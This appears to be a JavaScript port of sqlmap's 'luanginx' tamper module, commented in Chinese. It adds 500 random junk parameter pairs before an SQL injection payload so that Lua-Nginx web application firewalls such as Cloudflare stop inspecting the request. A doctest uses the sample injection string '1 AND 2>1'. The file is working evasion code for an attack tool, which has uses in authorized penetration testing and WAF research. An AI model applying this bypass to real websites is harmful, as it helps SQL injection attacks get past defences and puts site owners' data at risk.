// 对标 sqlmap luanginx.py：LUA-Nginx WAF（Cloudflare 等）参数数量上限绕过
// Lua-Nginx WAF 不支持处理海量参数 → 在 payload 前拼接大量随机垃圾参数对
// （官方为 500 对，通过 hints.PREPEND 注入参数区；JS 版直接前缀到 payload，
// & 分隔天然将垃圾对拆为独立参数）。可通过 ctx.tamperHints.luaginxCount 调整
export const luanginx = {
  name: 'luanginx',
  description: '前缀 500 个随机垃圾参数对（Lua-Nginx WAF 参数数量上限绕过）',
  doctests: [
    { input: '1 AND 2>1', match: '^[A-Za-z0-9]{2}=&' },
  ],
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    const count = (ctx && ctx.tamperHints && Number(ctx.tamperHints.luaginxCount)) || 500;
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const pairs = [];
    for (let i = 0; i < count; i++) {
      const a = chars[Math.floor(Math.random() * chars.length)];
      const b = chars[Math.floor(Math.random() * chars.length)];
      pairs.push(`${a}${b}=`);
    }
    return `${pairs.join('&')}&${payload}`;
  },
};
export default luanginx;
